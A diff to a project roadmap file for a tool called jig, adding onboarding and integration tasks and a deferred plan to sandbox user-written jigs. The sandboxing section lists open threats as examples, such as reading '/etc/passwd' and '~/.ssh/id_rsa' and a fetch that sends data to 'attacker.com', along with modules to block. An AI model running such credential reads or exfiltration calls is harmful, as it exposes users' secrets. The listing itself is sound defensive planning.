@@ -47,3 +47,26 @@
 - [ ] **Trending digest email** — daily/weekly email with trending GitHub repos + best Hacker News posts
 - [ ] **SEO Search Console update** — pull Google Search Console data, surface what to fix (drops, errors, opportunities)
 - [ ] **Daily question** — given user's current state/context, generate a thought-provoking daily question
+
+## Onboarding & Integrations
+
+- [ ] **Onboarding flow** — first-run experience for jig: guide users through connecting services (Composio, Gmail, etc.) and accepting terms of service. Should show clear setup steps, handle OAuth flows, track acceptance.
+- [ ] **Evaluate Composio alternatives** — research Nango (nango.dev, OSS self-hostable, no inbound triggers), Metorial (metorial.com), Pipedream (trigger ecosystem, multi-tenant auth). Check if they fit the proxy pattern (meta-tool + discover), pricing for personal use, privacy/SOC2, auth model, stdio vs remote MCP, inbound webhooks, self-hosting. Add second-source integration platforms to servers.json alongside composio.
+
+## Jig Sandboxing (deferred)
+
+Current state: jigs can only import `@jig/sdk` and `@jig/connections/*`. The `jig/*` wildcard alias is gone. Relative imports are rejected by the validator. OAuth credentials in the SQLite `credentials` table are no longer reachable via `import { getCredential } from "jig/db"` — that module path no longer exists.
+
+Still unrestricted (in-process runner):
+
+- [ ] **Block dangerous node/bun modules** — validator should reject `node:fs`, `node:child_process`, `bun:sqlite`, `node:worker_threads`. Jigs have no legitimate need for raw filesystem or subprocess access.
+- [ ] **Block dynamic `import()`, `eval()`, `Function()`** — static analysis bypass vectors. Reject at validator time.
+- [ ] **Filesystem read isolation** — jigs can still call `Bun.file("/etc/passwd").text()` or `readFileSync("~/.ssh/id_rsa")`. Needs OS-level sandbox.
+- [ ] **Network exfil** — jigs can still `fetch("https://attacker.com", { body })`. Needs network allow-list.
+- [ ] **Subprocess sandbox** — run each jig in a subprocess wrapped with `sandbox-exec` (macOS) or `bubblewrap` (Linux). Parent brokers LLM/MCP calls via Unix socket. Kernel-enforced, battle-tested via Anthropic's Claude Code (`@anthropic-ai/sandbox-runtime`).
+  - macOS: `sandbox-exec -f profile.sb bun run child.ts` — ~50ms overhead, kernel-enforced via TrustedBSD
+  - Linux: `bwrap --unshare-net --ro-bind / / --tmpfs /tmp --bind <socket> <socket> bun run child.ts` — AF_UNIX sockets pass through `--unshare-net` via mount namespace
+  - Requires: IPC protocol over Unix socket, cross-platform wrapper detection, bwrap install hint on Linux (Ubuntu 24.04 needs apparmor sysctl fix)
+  - Typegen needs a parallel `.jig/connections-sandbox/` variant that routes tool calls via IPC instead of direct `src/mcp/client.ts` imports
+  - ~150–500 LOC depending on IPC protocol choice
+- [ ] **CPU/memory limits** on child processes (`ulimit` on Unix, `taskpolicy` on macOS)
